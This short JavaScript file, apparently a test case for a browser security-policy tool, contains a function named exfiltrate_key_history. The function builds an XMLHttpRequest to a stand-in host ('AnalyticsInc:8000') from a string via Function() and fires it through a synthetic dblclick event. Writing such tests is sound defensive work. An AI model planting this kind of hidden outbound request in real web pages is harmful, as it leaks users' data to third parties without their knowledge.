
JAM.startProfile('load');
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dispatch", true);xmlhttp.send(null);';
  var button = document.getElementById("test");
  var event$$1 = new Event("dblclick");
  var v0 = Function(exp);
  button.addEventListener("dblclick", v0, false);
  button.dispatchEvent(event$$1);
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
